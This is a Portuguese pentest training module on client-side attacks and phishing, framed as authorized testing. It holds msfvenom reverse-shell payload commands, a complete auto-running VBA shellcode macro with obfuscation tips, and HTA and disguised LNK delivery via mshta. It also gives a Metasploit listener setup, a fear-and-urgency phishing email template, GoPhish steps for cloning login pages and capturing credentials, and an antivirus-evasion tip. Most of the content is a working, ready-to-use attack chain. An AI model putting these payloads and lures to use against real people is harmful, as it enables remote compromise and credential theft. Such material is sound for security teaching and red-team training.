# 🎯 12. Client-Side Attacks e Phishing

> Quando o alvo está bem protegido — sem serviço exposto, firewall rígido, EDR ativo — o vetor de acesso mais eficaz é o próprio usuário. Phishing é o vetor de entrada #1 em 91% dos ataques according to Verizon DBIR 2025.

<div align="center">

| ⏱️ Tempo | 📊 Nível | 🔧 Ferramentas |
|:--------:|:--------:|:--------------:|
| 80min | ⭐⭐⭐ Intermediário | `msfvenom, msfconsole (multi-handler), GoPhish, oletools` |

</div>

---

## 🎓 Por que isso importa?

Existem dois caminhos para ganhar acesso inicial em um pentest: **exploração de rede** (serviços abertos, CVEs em serviços) e **exploração client-side** (engenharia social, payloads entregues ao usuário). Quando o primeiro caminho não existe — alvo sem serviços expostos,.firewall南北 bloqueando tudo, EDR detectando exploits conhecidos — o segundo caminho é o único viável.

**Contexto de uso:**
- Redes internas corporativas: ports 445/3389 bloqueados de fora, mas o usuário abre qualquer anexo de email
- Ambientes com EDR que detecta EternalBlue, PrintNightmare, etc.
- Pentest com escopo que inclui engenharia social (testes de phishing autorizados)
- Red team operations onde stealth é prioridade — phishing é mais silencioso que brute force

**Ferramenta central:** `msfvenom` gera payloads em múltiplos formatos (VBA, HTA, LNK, PowerShell). O `multi-handler` do Metasploit recebe a conexão quando o usuário executa o payload.

---

## 📋 Pré-requisitos

| Conhecimento | Necessário? | Onde aprender |
|:-------------|:-----------:|:-------------:|
| Metasploit básico (msfconsole, handler) | Sim | Arquivo 08 |
| msfvenom básico (-p, -f, LHOST, LPORT) | Sim | Arquivo 08 |
| O que é reverse shell | Sim | Arquivo 09 |
| PowerShell básico | Recomendado | — |

---

## 🎯 Quando usar este módulo

- Quando o alvo **não tem serviços abertos** para exploração direta
- Quando quer simular **campanha de phishing** em pentest autorizado
- Quando precisa gerar **payloads Office/HTA/LNK** para entrega ao usuário
- Quando quer entender como **defender** contra esses vetores (perspectiva blue team)

---

## 🔄 Como funciona na prática

```
┌──────────────────────────────────────────────────────────────┐
│  1. PREPARAR INFRAESTRUTURA                                  │
│     - Configurar listener (multi-handler)                    │
│     - Gerar payload (msfvenom -f vba / hta-psh / lnk)       │
│     - Preparar cenário de phishing (email, pretexting)       │
└──────────────────────┬───────────────────────────────────────┘
                       ▼
┌──────────────────────────────────────────────────────────────┐
│  2. ENTREGAR PAYLOAD AO ALVO                                 │
│     - Email com anexo macro (VBA)                            │
│     - Link para HTA remoto                                   │
│     - Atalho LNK malicioso                                   │
│     - GoPhish para campanhas em escala                       │
└──────────────────────┬───────────────────────────────────────┘
                       ▼
┌──────────────────────────────────────────────────────────────┐
│  3. ALVO EXECUTA O PAYLOAD                                   │
│     - Word pede "Habilitar Conteúdo" (macro)                 │
│     - HTA executa via mshta.exe                              │
│     - LNK executa via explorer.exe → mshta.exe               │
└──────────────────────┬───────────────────────────────────────┘
                       ▼
┌──────────────────────────────────────────────────────────────┐
│  4. RECEBER CONEXÃO                                          │
│     - Multi-handler captura reverse shell                    │
│     - Meterpreter session ou shell interativo                │
│     - Exploração normal a partir daqui (privesc, lateral)    │
└──────────────────────────────────────────────────────────────┘
```

---

## 📄 Formatos de Payload com msfvenom

O `msfvenom` é o gerador de payloads do Metasploit. Cada formato serve para um vetor de entrega diferente.

### Formatos disponíveis

| Formato (`-f`) | Extensão | Vetor de entrega | Quando usar |
|:---------------|:---------|:-----------------|:------------|
| `vba` | `.docm` | Anexo Office com macro | Phishing corporativo, o alvo abre o documento |
| `hta-psh` | `.hta` | Link para HTA remoto | O alvo clica em um link e executa |
| `lnk` | `.lnk` | Atalho malicioso | USB drop, compartilhamento de rede |
| `psh-cmd` | `.bat` | Script PowerShell | Engenharia social via cmd |
| `exe` | `.exe` | Executável direto | Raramente usado (EPR detection) |
| `dll` | `.dll` | Biblioteca compartilhada | Side-loading, processo legítimo |

### Flags principais

| Flag | Descrição |
|:-----|:----------|
| `-p <payload>` | Payload a usar (ex: `windows/x64/meterpreter/reverse_tcp`) |
| `-f <formato>` | Formato de saída |
| `-o <arquivo>` | Salvar em arquivo |
| `LHOST=<ip>` | IP do listener (seu Kali) |
| `LPORT=<porta>` | Porta do listener |
| `EXITFUNC=thread` | Sair por thread (não mata o processo pai — mais stealth) |
| `-e <encoder>` | Encoder para bad chars (ex: `x86/shikata_ga_nai`) |
| `-b <chars>` | Bad chars a evitar (ex: `'\x00\x0a\x0d'`) |

---

## 📝 Vetor 1: Macro VBA (Documento Office)

O vetor mais clássico de phishing corporativo. Um documento Word/Excel com macro maliciosa que, quando o usuário clica em "Habilitar Conteúdo", executa um reverse shell.

### Passo 1 — Gerar shellcode com msfvenom

```bash
# Gerar shellcode em formato VBA (Array de bytes para colar na macro)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  EXITFUNC=thread -f vbapplication -o shellcode.vba
```

**Output esperado:**
```
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of vbapplication: 7360 bytes
Saved as: shellcode.vba
```

### Passo 2 — Criar a macro VBA no Word

Abra o Word → `Alt+F11` → Inserir → Módulo. Cole o seguinte código:

```vba
#If VBA7 Then
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" _
        (ByVal lpAddress As LongPtr, ByVal dwSize As Long, _
         ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

    Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" _
        (ByVal lDestination As LongPtr, ByRef Source As Any, ByVal Length As Long)

    Private Declare PtrSafe Function CreateThread Lib "kernel32" _
        (ByVal lpSecAttr As LongPtr, ByVal dwStackSize As Long, _
         ByVal lpStartAddr As LongPtr, lpParam As LongPtr, _
         ByVal dwFlags As Long, ByRef lpThreadId As Long) As LongPtr
#Else
    Private Declare Function VirtualAlloc Lib "kernel32" _
        (ByVal lpAddress As Long, ByVal dwSize As Long, _
         ByVal flAllocationType As Long, ByVal flProtect As Long) As Long

    Private Declare Sub RtlMoveMemory Lib "kernel32" _
        (ByVal lDestination As Long, ByRef Source As Any, ByVal Length As Long)

    Private Declare Function CreateThread Lib "kernel32" _
        (ByVal lpSecAttr As Long, ByVal dwStackSize As Long, _
         ByVal lpStartAddr As Long, lpParam As Long, _
         ByVal dwFlags As Long, ByRef lpThreadId As Long) As Long
#End If

Sub AutoOpen()
    RunShell
End Sub

Sub Document_Open()
    RunShell
End Sub

Sub RunShell()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long

    ' --- COLAR OUTPUT DO msfvenom -f vbapplication AQUI ---
    buf = Array(72, 131, 228, 240, 232, ...)
    ' --- FIM DO SHELLCODE ---

    addr = VirtualAlloc(0, UBound(buf) + 1, &H3000, &H40)

    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        RtlMoveMemory addr + counter, data, 1
    Next counter

    CreateThread 0, 0, addr, 0, 0, 0
End Sub
```

**Pontos-chave:**
- `AutoOpen()` e `Document_Open()` são gatilhos automáticos — executam quando o documento é aberto
- `VirtualAlloc` aloca memória RWX (Read-Write-Execute)
- `RtlMoveMemory` copia os bytes da shellcode para a memória alocada
- `CreateThread` inicia a execução da shellcode
- `#If VBA7` garante compatibilidade com Office 32-bit e 64-bit

### Passo 3 — Configurar handler no Kali

```bash
# No Kali, configurar o listener ANTES de enviar o documento
msfconsole -q -x "use exploit/multi/handler; \
  set payload windows/x64/meterpreter/reverse_tcp; \
  set LHOST 192.168.1.100; \
  set LPORT 4444; \
  set ExitOnSession false; \
  exploit -j"
```

**Output esperado:**
```
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 192.168.1.100:4444
```

### Passo 4 — Salvar e entregar

1. Salve o documento como `.docm` (macro-enabled): `Arquivo → Salvar Como → Word Macro-Enabled Document (*.docm)`
2. Envie por email como anexo — o subject deve ser convincente (ver seção de phishing abaixo)
3. Quando o alvo abrir e clicar em "Habilitar Conteúdo", a session Meterpreter será aberta

### Ofuscação básica para evitar detecção manual

O código acima é óbvio para qualquer pessoa que examine a macro. Técnicas básicas de ofuscação:

```vba
' Ofuscação 1: Nomes de funções não-obvios
Private Declare PtrSafe Function X1 Lib "kernel32" _
    (ByVal a As LongPtr, ByVal b As Long, _
     ByVal c As Long, ByVal d As Long) As LongPtr

' Ofuscação 2: Strings divididas
Dim s1 As String, s2 As String, s3 As String
s1 = "Vir"
s2 = "tual"
s3 = "Alloc"
' Usa: Call GetLibFunc(s1 & s2 & s3, ...)

' Ofuscação 3: Variáveis de loop com nomes genéricos
Dim i As Long, j As Variant, k As Long
' Em vez de: counter, data, addr
```

**⚠️ Nota:** Isso ofusca de *review manual*. Ferramentas de EDR/AMSI detectam o comportamento (VirtualAlloc + CreateThread com shellcode). Para evasão real, seria necessário bypass de AMSI — escopo além deste módulo.

---

## 🌐 Vetor 2: HTA (HTML Application)

HTA é um formato legítimo do Windows que executa VBScript/JScript com privilégios de aplicação local. O `mshta.exe` é um binário assinado pela Microsoft — bypass de AppLocker se não estiver bloqueado.

### Gerar payload HTA

```bash
# Gerar HTA com PowerShell reverse shell embutido
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f hta-psh -o payload.hta
```

**Output esperado:**
```
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of hta-psh: 7388 bytes
Saved as: payload.hta
```

### Conteúdo gerado (exemplo simplificado)

```html
<html>
<head>
<script language="VBScript">
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -nop -w hidden -e <BASE64_ENCODED_PAYLOAD>", 0, True
</script>
</head>
<body>
<script>
self.close();
</script>
</body>
</html>
```

### Entregar o HTA

**Opção 1 — Servidor HTTP direto:**
```bash
# Servir o HTA via Python HTTP server
mkdir -p /srv/http && cp payload.hta /srv/http/
cd /srv/http && python3 -m http.server 8080
```

O alvo acessa: `http://192.168.1.100:8080/payload.hta`

**Opção 2 — Via LNK (mais convincente):**
Criar um atalho LNK que chama `mshta.exe` com a URL do HTA (ver vetor 3 abaixo).

### Como funciona do lado do alvo

1. Usuário clica no link/atuador
2. Windows executa `mshta.exe` com o conteúdo do HTA
3. `mshta.exe` roda o VBScript que lança PowerShell
4. PowerShell conecta de volta ao listener (reverse shell)

---

## 🔗 Vetor 3: Atalho LNK Malicioso

Um arquivo `.lnk` (atalho do Windows) pode ser configurado para executar comandos arbitrários. Disfarçado como documento PDF ou planilha, o usuário clica e executa o payload.

### Criar LNK com msfvenom

```bash
# Gerar LNK que executa PowerShell reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f lnk -o "Relatorio_Q4_2025.lnk"
```

**Output esperado:**
```
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of lnk: 7432 bytes
Saved as: Relatorio_Q4_2025.lnk
```

### Disfarce manual (se quiser controle total)

```powershell
# Criar LNK manualmente via PowerShell no Windows
$objShell = New-Object -ComObject WScript.Shell
$shortcut = $objShell.CreateShortcut("C:\Users\Public\Relatorio.lnk")
$shortcut.TargetPath = "C:\Windows\System32\mshta.exe"
$shortcut.Arguments = "http://192.168.1.100:8080/payload.hta"
$shortcut.IconLocation = "C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,0"
$shortcut.Description = "Relatório Financeiro Q4"
$shortcut.Save()
```

**Pontos-chave:**
- `TargetPath` aponta para `mshta.exe` (binário legítimo)
- `IconLocation` usa ícone do Excel (disfarce visual)
- O LNK pode ser colocado em USB, compartilhamento de rede, ou enviado por email (como `.zip`)

---

## 🎭 Engenharia Social Aplicada ao Pentest

Phishing não é só "mandar malware" — é construir um **cenário convincente** que leva o alvo a executar o payload. Aqui está como estruturar um phishing simulado para pentest autorizado.

### Estrutura de um email de phishing

```
De: <nome_sobrenome>@<empresa-legitima>.com    ← remetente falso (spoofed)
Assunto: Ação Urgente: Atualize suas credenciais até amanhã

Prezado(a) [Nome do Funcionário],

Detectamos uma tentativa de acesso não autorizada à sua conta.
Por favor, clique no link abaixo para verificar sua identidade e
restaurar o acesso:

[Restaurar Acesso Agora]  ← link para payload ou landing page

Este link expira em 24 horas. Em caso de dúvida, entre em contato
com o Suporte Técnico.

Atenciosamente,
Suporte Técnico
```

### Elementos-chave de pretexting

| Elemento | Exemplo | Por que funciona |
|:---------|:--------|:-----------------|
| **Urgência** | "expira em 24 horas", "ação imediata necessária" | Pressiona o alvo a agir sem pensar |
| **Medo** | "conta comprometida", "acesso não autorizado" | Ativa resposta de sobrevivência |
| **Autoridade** | "Suporte Técnico", "Departamento de TI" | Parece legítimo e oficial |
| **Familiaridade** | Usar nome real, cargo, departamento | Mostra que o atacante "conhece" a empresa |
| **Remetente falso** | `suporte@microsft.com` (typo) | Parece o domínio real, mas não é |

### Cadastro de engenharia social para pentest

| Vetor | Exemplo de cenário | Payload |
|:------|:-------------------|:--------|
| Email corpo | "Atualize sua senha" | Link para HTA |
| Email anexo | "Relatório do RH" | Documento com macro VBA |
| Email link | "Acesse o SharePoint" | Link para LNK → HTA |
| USB drop | USB no estacionamento com LNK | LNK → PowerShell |
| Teams/Slack | "Olha esse documento" | Link para HTA |

---

## 📧 GoPhish: Phishing em Escala

Para campanhas de phishing maiores (testes de segurança corporativos), o **GoPhish** é a ferramenta open-source padrão. Ele gerencia listas de alvos, templates de email, landing pages e rastreia quem clicou/submitiu credenciais.

### Instalação

```bash
# Download da última release (verificar versão atual em github.com/gophish/gophish/releases)
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip

# Extrair
unzip gophish-v0.12.1-linux-64bit.zip -d gophish/
cd gophish/

# Tornar executável
chmod +x gophish
```

### Configuração básica

Edite o `config.json` antes de iniciar:

```json
{
  "admin_server": {
    "listen_url": "127.0.0.1:3333",
    "use_tls": true
  },
  "phish_server": {
    "listen_url": "0.0.0.0:80",
    "use_tls": false
  }
}
```

**⚠️ Segurança:** Nunca exponha o painel admin (`0.0.0.0:3333`). Use SSH tunneling para acessar remotamente.

### Iniciar GoPhish

```bash
sudo ./gophish
```

**Output esperado (primeira execução):**
```
Please login with the username admin and the password <SENHA_GERADA>
time="..." level=info msg="Starting admin server at https://127.0.0.1:3333"
time="..." level=info msg="Starting phishing server at http://0.0.0.0:80"
```

### Acessar o painel

```bash
# Criar tunnel SSH do seu Kali para o servidor GoPhish
ssh -L 3333:127.0.0.1:3333 usuario@IP_SERVIDOR_GOPHISH
```

Acesse `https://localhost:3333` no navegador. Use a senha gerada no primeiro login.

### Fluxo de campanha no GoPhish

1. **Sending Profile** → Configure o SMTP (Mailgun, SendGrid, ou Postfix local)
2. **Email Template** → Crie o email de phishing com `{{.URL}}` como link rastreável
3. **Landing Page** → Clone a página de login real (ex: Microsoft 365, Google Workspace)
4. **Users & Groups** → Importe CSV com `Nome,Email,Cargo`
5. **Campaign** → Combine tudo e lance a campanha
6. **Dashboard** → Acompanhe: emails abertos → links clicados → credenciais submetidas

### DNS records necessários

Para que os emails cheguem na caixa de entrada (não no spam):

```bash
# SPF
yourdomain.com.  300  IN  TXT  "v=spf1 ip4:SEU_IP_VPS ~all"

# DMARC
_dmarc.yourdomain.com.  300  IN  TXT  "v=DMARC1; p=none; rua=mailto:admin@yourdomain.com"
```

---

## ❌ Erros Comuns

| Erro | Causa | Solução |
|:-----|:------|:--------|
| "Session não abre" | Handler não configurado ou porta bloqueada | Verifique `multi-handler` antes de enviar o payload |
| "Macro não executa" | Office Protegido ou macros desabilitadas via GPO | Teste em ambiente controlado; Office 2019+ tem AMSI |
| "HTA não abre" | `mshta.exe` bloqueado por AppLocker | Verifique as regras de AppLocker no alvo |
| "Email vai para spam" | Sem SPF/DKIM/DMARC, IP sem reputação | Configure DNS corretamente; use provedor SMTP com reputação |
| "Payload detectado por AV" | Assinatura conhecida | Use encoding (`-e x86/shikata_ga_nai`) ou payload customizado |

---

## 🧪 Labs Práticos

| # | Plataforma | Lab | O que praticar | Tempo |
|---|:----------:|:----|:---------------|:-----:|
| 1 | TryHackMe | [Phishing Analysis](https://tryhackme.com/room/phishingcybersecurity) | Identificar phishing emails, analisar headers, URLs suspeitas | 45min |
| 2 | TryHackMe | [Phishmas Greetings](https://tryhackme.com/room/spottingphishing-aoc2025) | Spotting phishing: impersonation, spoofing, side-channel | 30min |
| 3 | HackTheBox | [Phishing](https://app.hackthebox.com/challenges) | Phishing como vetor de acesso inicial | 60min |
| 4 | Local | Macro VBA Lab | Criar documento Office com macro → reverse shell → privesc | 45min |
| 5 | Local | GoPhish Lab | Instalar GoPhish, configurar SMTP, criar campanha completa | 60min |

---

## 📚 Referências

- [MITRE ATT&CK — Spearphishing Attachment (T1566.001)](https://attack.mitre.org/techniques/T1566/001/)
- [MITRE ATT&CK — User Execution: Malicious File (T1204.002)](https://attack.mitre.org/techniques/T1204/002/)
- [HackTricks — Phishing](https://book.hacktricks.xyz/generic-methodologies-and-resources/phishing)
- [GoPhish Documentation](https://docs.getgophish.com/)
- [PayloadsAllTheThings — Client Side Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Client%20Side%20Attacks/README.md)
- [oletools — Análise de VBA](https://github.com/decalage2/oletools)
- [MITRE ATT&CK — T1059.005: Visual Basic](https://attack.mitre.org/techniques/T1059/005/)

---

## ✅ Validação

Após este módulo, você deve conseguir:

- [ ] Gerar payloads em formato VBA, HTA e LNK com `msfvenom`
- [ ] Criar um documento Office com macro VBA funcional (VirtualAlloc + CreateThread)
- [ ] Configurar `multi-handler` para receber conexões de payloads client-side
- [ ] Entender a estrutura de um email de phishing (urgência, autoridade, remetente falso)
- [ ] Instalar e configurar GoPhish para campanhas de phishing em escala
- [ ] Saber quando usar cada vetor (macro vs HTA vs LNK)
- [ ] Compreender as defesas existentes (AMSI, AppLocker, macros desabilitadas por GPO)
